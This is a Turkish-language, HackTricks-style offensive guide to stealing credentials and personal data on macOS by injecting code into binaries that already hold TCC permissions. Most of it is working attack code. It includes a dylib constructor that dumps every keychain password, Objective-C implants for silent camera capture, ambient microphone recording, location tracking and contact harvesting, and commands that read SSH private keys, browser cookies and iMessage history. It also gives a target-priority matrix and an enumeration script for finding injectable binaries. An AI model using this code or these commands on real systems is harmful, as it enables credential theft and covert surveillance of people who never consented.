# TCC Permissions Üzerinden macOS Credential ve Data Theft

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

macOS TCC (Transparency, Consent, and Control), hassas kullanıcı verilerine erişimi korur. Bir attacker, **halihazırda TCC izinlerine sahip bir binary'yi ele geçirdiğinde**, bu izinleri devralır. Bu sayfa, data theft ile ilgili her TCC izninin exploitation potansiyelini belgeler.<sup>[[2]](#references)</sup>

> [!WARNING]
> TCC izni verilmiş bir binary'ye (DYLD injection, dylib hijacking veya task port üzerinden) code injection yapılması, **binary'nin tüm TCC izinlerinin sessizce devralınmasını** sağlar. Aynı process korunan verileri okuduğunda ek bir prompt veya verification gerçekleşmez.

---

## Keychain Access Groups

### Hedef

macOS Keychain şunları depolar:
- **Wi-Fi passwords** — kaydedilmiş tüm wireless network credential'ları
- **Website passwords** — Safari, Chrome (Keychain kullanırken) ve diğer browser password'ları
- **Application passwords** — email account'ları, VPN credential'ları, development token'ları
- **Certificates and private keys** — code signing, client TLS, S/MIME encryption
- **Secure notes** — kullanıcı tarafından depolanan secret'lar

### Entitlement: `keychain-access-groups`

Keychain öğeleri **access groups** halinde düzenlenir. Bir application'ın `keychain-access-groups` entitlement'ı, erişebileceği grupları listeler:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Kamera Erişimi (kTCCServiceCamera)

### Exploitation

Kamera TCC iznine sahip bir binary (`kTCCServiceCamera` veya `com.apple.security.device.camera` entitlement aracılığıyla) fotoğraf ve video çekebilir:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Sessiz Yakalama
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> **macOS Sonoma** ile birlikte menü çubuğundaki kamera göstergesi kalıcıdır ve programatik olarak gizlenemez. **Daha eski macOS sürümlerinde** kısa süreli bir capture işlemi fark edilebilir bir gösterge oluşturmayabilir.

---

## Mikrofon Erişimi (kTCCServiceMicrophone)

### Exploitation

Mikrofon erişimi, yerleşik mikrofondan, kulaklıktan veya bağlı ses giriş aygıtlarından gelen tüm sesleri capture eder:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Saldırı: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Konum Takibi (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Sürekli İzleme
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kişiler / Takvim / Fotoğraflar

### Kişisel Verilerin Sızdırılması

| TCC Service | Framework | Veri |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | İsimler, e-postalar, telefonlar, adresler |
| `kTCCServiceCalendar` | `EventKit` | Toplantılar, katılımcılar, konumlar |
| `kTCCServicePhotos` | `Photos.framework` | Fotoğraflar, ekran görüntüleri, konum metadata'sı |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Kişileri Toplama
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud Hesabına Erişim

### Entitlement: `com.apple.private.icloud-account-access`

Bu entitlement, aşağıdakilere erişim sağlayarak `com.apple.iCloudHelper` XPC service ile iletişim kurulmasına olanak tanır:
- **iCloud tokens** — kullanıcının Apple ID'si için kimlik doğrulama token'ları
- **iCloud Drive** — tüm cihazlardan senkronize edilen belgeler
- **iCloud Keychain** — tüm Apple cihazları arasında senkronize edilen parolalar
- **Find My** — kullanıcının tüm Apple cihazlarının konumu<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> iCloud yetkisine sahip bir binary'yi ele geçirmek, saldırıyı **tek bir cihazdan tüm Apple ekosistemine** genişletir: diğer Mac'ler, iPhone'lar, iPad'ler ve Apple Watch. iCloud Keychain senkronizasyonu, tüm cihazlardaki parolalara erişilebilmesini sağlar.

---

## Tam Disk Erişimi (kTCCServiceSystemPolicyAllFiles)

### En Güçlü TCC İzni

Tam Disk Erişimi, aşağıdakiler de dahil olmak üzere **sistemdeki her dosyaya** okuma yetkisi verir:
- Diğer uygulamaların verileri (Messages, Mail, Safari geçmişi)
- TCC veritabanları (diğer tüm izinleri açığa çıkarır)
- SSH anahtarları ve yapılandırması
- Browser çerezleri ve oturum token'ları
- Uygulama veritabanları ve cache'leri
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

Injectable TCC-granted binaries değerlendirilirken veri değerine göre önceliklendirme yapın:

| Priority | TCC Permission | Why |
|---|---|---|
| **Critical** | Full Disk Access | Her şeye erişim |
| **Critical** | TCC Manager | Herhangi bir permission verebilir |
| **High** | Keychain Access Groups | Saklanan tüm parolalar |
| **High** | iCloud Account Access | Birden fazla cihazın ele geçirilmesi |
| **High** | Input Monitoring (ListenEvent) | Keylogging |
| **High** | Accessibility | GUI kontrolü, kendi kendine permission verme |
| **Medium** | Screen Capture | Görsel veri yakalama |
| **Medium** | Camera + Microphone | Gözetleme |
| **Medium** | Contacts + Calendar | Social engineering verileri |
| **Low** | Location | Fiziksel takip |
| **Low** | Photos | Kişisel veriler |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Referanslar

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — "What Happens on your Mac, Stays on Apple's iCloud?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)

{{#include ../../../../banners/hacktricks-training.md}}
